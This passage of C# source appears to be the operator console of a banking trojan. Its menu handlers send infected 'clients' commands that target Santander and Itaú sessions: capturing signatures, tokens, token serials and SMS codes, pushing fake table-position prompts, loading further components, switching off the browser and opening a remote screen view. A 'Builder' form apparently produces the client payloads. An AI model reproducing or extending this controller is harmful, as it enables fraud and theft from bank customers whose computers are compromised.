        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Santa|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTAASSINATURAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaASS|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTASMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaTKF|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTATABELAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String posic = Interaction.InputBox("Digite o nº da posição da tabela.\n Ex: 10", "Enviar Posição", "", 10, 10);
            String message = String.Format("<|SantaTAB|>{0}", posic);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTALOADERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaLOD|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTAENTRADAToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Santa|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTAASSINTATURAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaASSJU|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTATOKENToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaTOKJU|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTATOKENSERIALToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaTOKSEJU|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTALOADERToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SantaLOD|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void itaFisica_EntradaPrincipal_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaRSMAIN|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bCriar_Click(object sender, EventArgs e)
        {
            Builder bld = new Builder();
            bld.Visible = true;
        }

        private void Menu_Opened(object sender, EventArgs e)
        {
            if (listView_clients.SelectedItems.Count > 0)
            {
                Menu.Enabled = true;
            }
            else
            {
                Menu.Enabled = false;
            }
        }

        private void tlistarJanelas_Click(object sender, EventArgs e)
        {
            cJanelas.Items.Clear();

            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|JANELAS|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void tPretoBranco_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|GRAY|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void tColorido_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|COLOR|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void tNavegador_Click(object sender, EventArgs e)
        {
            if (listView_clients.SelectedItems.Count > 0)
            {

                String conteudo = cJanelas.Text;
                String message = String.Format("<|FOCALIZAR|>{0}", conteudo);
                ListViewItem item = listView_clients.FocusedItem;
                String clientId = item.Name;
                RemoteClient client = this.remoteClientManager.GetClientById(clientId);
                if (client != null)
                {
                    try
                    {
                        client.mreMessage.WaitOne();
                        client.queueMessage.AddMessage(message);
                        Thread.Sleep(2000);

                        if (client != null)
                        {
                            client.RemoteOn();
                            this.menuRemoteView = new MenuRemoteView(client);
                            String value = item.SubItems[6].Text.ToString();
                            String[] tokens = value.Split(new string[] { " x " }, StringSplitOptions.None);
                            Int32 w = Convert.ToInt32(tokens[0]);
                            Int32 h = Convert.ToInt32(tokens[1]);

                            MenuRemoteView HandleToRV = new MenuRemoteView();
                            HandleToRV.SetFormSize(w, h);

                            this.menuRemoteView.Visible = true;
                        }
                    }

                    catch (Exception ex) { MessageBox.Show(ex.ToString()); }
                }
            }
        }

        private void tNavOFF_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|NAVOFF|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void tEnviarTexto_Click(object sender, EventArgs e)
        {
            
            String message = String.Format("<|MSG|>{0}", tEnviarMSG.Text);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                    tEnviarMSG.Text = "";
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void listView_clients_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
